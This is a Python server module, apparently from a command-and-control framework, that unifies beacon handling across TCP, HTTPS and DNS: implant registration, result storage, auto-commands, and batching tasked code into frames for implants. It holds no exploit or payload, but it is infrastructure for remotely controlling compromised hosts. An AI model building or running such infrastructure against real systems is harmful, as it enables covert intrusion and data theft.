"""server/sessions/engine.py — 共享 beacon 周期逻辑（TCP/HTTPS/DNS 三传输共用）。

此前 register / 结果落库 / auto_commands / 结果处理器 在 BeaconSession 与
HTTPS/DNS 传输里各写一份，导致元数据（via/fork/shell）在非 TCP 通道丢失、
结果处理器（download 自动续传）在非 TCP 通道失效。这里收敛成单一实现。
"""

import json
import threading

from server.core.events import EVT_CONNECT, EVT_TASK_RESULT
from server.core.log import get_logger
from server.client_manager import TaskResult

logger = get_logger("beacon_engine")


class InFlight:
    """stateless 传输的任务在途登记：task_id → (result_processor, proc_arg)。

    HTTPS/DNS 是无状态轮询：task 弹出即弃，result 在后续独立请求里回来，
    需要记住每个 task 的结果处理器信息才能跑结果处理器（download 续传）。
    """

    def __init__(self):
        self._d = {}
        self._lock = threading.Lock()

    def track(self, task) -> None:
        if getattr(task, "result_processor", ""):
            with self._lock:
                self._d[task.task_id] = (task.result_processor,
                                         getattr(task, "proc_arg", ""))

    def take(self, task_id: str) -> tuple:
        with self._lock:
            return self._d.pop(task_id, ("", ""))


def register_beacon(reg: dict, mgr, events) -> tuple:
    """注册 + via/fork/shell 标记 + 上线事件。返回 (client_id, is_new)。"""
    client_id = reg["id"]
    via = reg.get("via", "")
    is_fork = bool(reg.get("fork", False))
    is_shell = bool(reg.get("shell", False))
    client_id, is_new = mgr.register(client_id, is_client=False)
    rec = mgr.get_client(client_id)
    if rec:
        rec.via = via            # 无条件覆盖：直连注册帧无 via → 清空（准确反映当前通道）
        if is_fork:
            rec.is_fork = True
        rec.is_shell = is_shell
        rec.active = True
    events.emit(EVT_CONNECT, client_id, first=bool(is_new), via=via or None,
                fork=is_fork or None, shell=is_shell or None)
    return client_id, is_new


def store_result(client_id, task_id, output, error, mgr, events,
                 max_result_size, smods=None, dispatcher=None,
                 result_processor="", proc_arg="", overwrite=False):
    """结果截断 + 落库 + 事件 + 结果处理器（三传输共用）。"""
    if len(output) > max_result_size:
        output = (output[:max_result_size]
                  + f"\n... (truncated, {len(output)} bytes total)")
    mgr.add_result(client_id, TaskResult(task_id=task_id, output=output,
                                         error=error), overwrite=overwrite)
    events.emit(EVT_TASK_RESULT, client_id, task_id=task_id,
                output=output[:200])
    if result_processor and smods is not None:
        try:
            out = smods.run(result_processor,
                            [output, error, proc_arg, dispatcher, client_id])
        except Exception as e:
            logger.warning("result processor %s failed: %s",
                           result_processor, e)
            return
        try:
            fields = json.loads(out)
        except ValueError:
            return
        if isinstance(fields, dict) and fields:
            mgr.update_metadata(client_id, fields)


def build_auto_tasks(commands, client_id, dispatcher) -> list:
    """把 auto_commands 配置构建成任务列表（构建失败告警跳过）。"""
    tasks = []
    if not commands or not dispatcher:
        return tasks
    for cmd_str in commands:
        cmd_str = cmd_str.strip()
        if not cmd_str:
            continue
        parts = cmd_str.split()
        name, args = parts[0], parts[1:]
        try:
            task = dispatcher.build_task_for(client_id, name, args)
        except ValueError as e:
            logger.warning("auto command '%s' build failed: %s", name, e)
            continue
        if task is None:
            logger.warning("auto command module not found: %s", name)
            continue
        tasks.append(task)
    return tasks


def drain_tasks(client_id: str, tq) -> list:
    """弹出某 beacon 的全部待执行任务（FIFO 顺序）。批量模型:一次下发全部。"""
    tasks = []
    while True:
        task = tq.pop(client_id)
        if task is None:
            return tasks
        tasks.append(task)


def take_task_batch(client_id: str, tq, budget: int) -> list:
    """按字节预算弹出一批任务（超预算的任务放回队头,下次再取）。

    无状态通道(HTTPS/DNS)每次响应只能回一帧,用它分批领取;
    预算近似 = task_id + code 长度 + 帧开销余量。
    """
    tasks, size = [], 0
    while True:
        t = tq.pop(client_id)
        if t is None:
            return tasks
        approx = len(getattr(t, "task_id", "")) + len(getattr(t, "code", "")) + 64
        if tasks and size + approx > budget:
            tq.push_front(client_id, t)
            return tasks
        tasks.append(t)
        size += approx


def pack_tasks_batch(tasks, budget: int) -> list:
    """按字节预算把任务列表拆成多批（每批 = 原 Task 对象列表）。

    预算近似 = task_id + code 长度 + 帧开销余量;超预算拆批,防单帧超限。
    返回批次列表,每批仍是 Task 对象(重发时可直接 push_front 原对象)。
    """
    batches, cur, size = [], [], 0
    for t in tasks:
        approx = len(getattr(t, "task_id", "")) + len(getattr(t, "code", "")) + 64
        if cur and size + approx > budget:
            batches.append(cur)
            cur, size = [], 0
        cur.append(t)
        size += approx
    if cur:
        batches.append(cur)
    return batches


def batch_response(acked: list, tasks: list, budget: int) -> list:
    """构造批量下发帧载荷列表: [{tasks: [...], acked: [...]}, ...]（按预算分批）。

    acked 只携带在首批(implant 端收到任意帧的 acked 即清理本地结果)。
    """
    frames = []
    if not tasks:
        return [{"tasks": [], "acked": list(acked)}]
    first = True
    for batch in pack_tasks_batch(tasks, budget):
        frames.append({
            "tasks": [{"task_id": t.task_id, "code": t.code} for t in batch],
            "acked": list(acked) if first else [],
        })
        first = False
    return frames
